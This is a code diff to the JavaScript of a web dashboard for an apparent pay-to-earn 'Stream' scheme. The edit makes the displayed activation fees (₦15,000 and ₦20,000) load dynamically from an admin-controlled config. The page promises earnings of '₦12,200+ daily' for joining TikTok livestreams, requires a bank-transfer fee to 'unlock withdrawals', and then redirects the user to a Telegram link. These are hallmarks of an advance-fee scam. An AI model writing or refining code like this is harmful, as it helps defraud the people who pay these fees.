@@ -641,11 +641,14 @@
 
     let userPlanType = "regular";
     let telegramRedirectUrl = "https://t.me/Miraclemedia"; // Default backup fallback URL
+    
+    // Global active cache objects to sync state between both snapshot listeners seamlessly
+    let dbConfigCache = null;
 
     window.showStreamAlert = (msg, type = 'info') => {
         const toast = document.getElementById('streamToast');
         const title = document.getElementById('toastTitle');
-        if (!toast) return; // Guard clause in case element is missing
+        if (!toast) return; 
         
         document.getElementById('toastMsg').innerText = msg;
         
@@ -671,10 +674,28 @@
         }, 60);
     };
 
-    // FIXED: NOW MATCHES THE ADMIN PATH "configs/main" AND CORRECT HTML IDs
+    // Helper evaluation framework function to keep the user's plan amounts completely dynamic
+    function refreshDynamicAmounts() {
+        if (!dbConfigCache) return;
+        const isPlus = (userPlanType === 'prime');
+        
+        if (isPlus) {
+            const dynamicPrime = dbConfigCache.primeAmount || "₦20,000";
+            if(document.getElementById('modalMessage')) document.getElementById('modalMessage').textContent = `Activate your Stream Prime Plan account (${dynamicPrime}) to unlock VIP rewards, x15 boost and higher withdrawal limits.`;
+            document.getElementById('popAmount').textContent = dynamicPrime;
+        } else {
+            const dynamicRegular = dbConfigCache.nigeriaAmount || "₦15,000";
+            if(document.getElementById('modalMessage')) document.getElementById('modalMessage').textContent = `Complete your Stream Fee payment (${dynamicRegular}) to unlock withdrawals and all Stream modules.`;
+            document.getElementById('popAmount').textContent = dynamicRegular;
+        }
+    }
+
+    // ON-SNAPSHOT REALTIME LISTENER FOR ADMIN CONFIGS
     onSnapshot(doc(db, "configs", "main"), (snapshot) => {
         if (snapshot.exists()) {
             const configData = snapshot.data();
+            dbConfigCache = configData; // Store globally to read current snapshot field values inside auth state
+            
             document.getElementById('BankName').textContent = configData.bankName || "Not Configured";
             document.getElementById('accountNumber').textContent = configData.accountNumber || "Not Configured";
             document.getElementById('accountName').textContent = configData.accountName || "Not Configured";
@@ -682,6 +703,9 @@
             if (configData.telegramLink) {
                 telegramRedirectUrl = configData.telegramLink;
             }
+            
+            // Re-evaluate dynamic pricing fields instantly when configurations live-update on the panel
+            refreshDynamicAmounts();
         }
     }, (error) => {
         console.error("Error streaming admin configs matrix:", error);
@@ -706,7 +730,6 @@
                 
                 const firstName = fullName.split(' ')[0];
                 
-                // Safe check elements before updating dashboard view variables
                 if(document.getElementById('welcomeName')) document.getElementById('welcomeName').textContent = `HI, ${firstName}!`;
                 if(document.getElementById('userEmail')) document.getElementById('userEmail').textContent = user.email;
                 
@@ -715,26 +738,23 @@
 
                 const isPlus = (userPlanType === 'prime');
 
-                // TRACKING AND UPDATING VALUES ACCORDING TO USER DATABASE SCHEMA
                 if (isPlus) {
                     if(document.getElementById('earningsAmount')) document.getElementById('earningsAmount').textContent = '₦20,000';
                     if(document.getElementById('planBadge')) document.getElementById('planBadge').textContent = 'Prime Plan';
                     if(document.getElementById('balanceNote')) document.getElementById('balanceNote').innerHTML = 'Prime Plan – Higher daily earnings & VIP perks';
                     if(document.getElementById('boostBadge')) document.getElementById('boostBadge').textContent = 'x15 BOOST';
                     if(document.getElementById('streamMessage')) document.getElementById('streamMessage').textContent = 'Join Livestreams on TikTok for x15 boost (Premium Plus benefit)';
-                    if(document.getElementById('modalMessage')) document.getElementById('modalMessage').textContent = 'Activate your Stream Prime Plan account (₦20,000) to unlock VIP rewards, x15 boost and higher withdrawal limits.';
-                    document.getElementById('popAmount').textContent = '₦20,000';
                 } else {
                     if(document.getElementById('earningsAmount')) document.getElementById('earningsAmount').textContent = '₦14,000';
                     if(document.getElementById('planBadge')) document.getElementById('planBadge').textContent = 'Regular Plan';
                     if(document.getElementById('balanceNote')) document.getElementById('balanceNote').innerHTML = 'Activate your account to start earning up to ₦12,200+ daily';
                     if(document.getElementById('boostBadge')) document.getElementById('boostBadge').textContent = 'x10 BOOST';
                     if(document.getElementById('streamMessage')) document.getElementById('streamMessage').textContent = 'Join Livestreams on TikTok for x10 boost on StreamStatus — paid in ₦';
-                    if(document.getElementById('modalMessage')) document.getElementById('modalMessage').textContent = 'Complete your Stream Fee payment (₦15,000) to unlock withdrawals and all Stream modules.';
-                    document.getElementById('popAmount').textContent = '₦15,000';
                 }
 
-                // If account is already processed and marked true, show full tracking data values
+                // Render dynamic amount allocations safely from cache
+                refreshDynamicAmounts();
+
                 const storagePaidKey = localStorage.getItem(`paid_${user.uid}`);
                 if (data.paidStatus === true || storagePaidKey === 'true') {
                     if (storagePaidKey !== 'true') localStorage.setItem(`paid_${user.uid}`, 'true');
@@ -768,11 +788,9 @@
     document.querySelectorAll('.modal-trigger').forEach(trigger => trigger.addEventListener('click', openModal));
     if(document.getElementById('cancelModalLink')) document.getElementById('cancelModalLink').addEventListener('click', closeModal);
     
-    // Connect "Pay Stream Fee" button directly to full screen display view
     if(document.getElementById('activateNowBtn')) document.getElementById('activateNowBtn').addEventListener('click', openDetailsModal);
     if(document.getElementById('closeDetailsBtn')) document.getElementById('closeDetailsBtn').addEventListener('click', closeDetailsModal);
 
-    // FIXED: REDIRECTS DIRECTLY TO THE TELEGRAM URL FETCHED FROM THE ADMIN DASHBOARD
     document.getElementById('madeTransferBtn').addEventListener('click', () => {
         window.location.href = telegramRedirectUrl;
     });
@@ -799,3 +817,5 @@
         this.classList.add('active');
     }));
 </script>
+</body>
+</html>
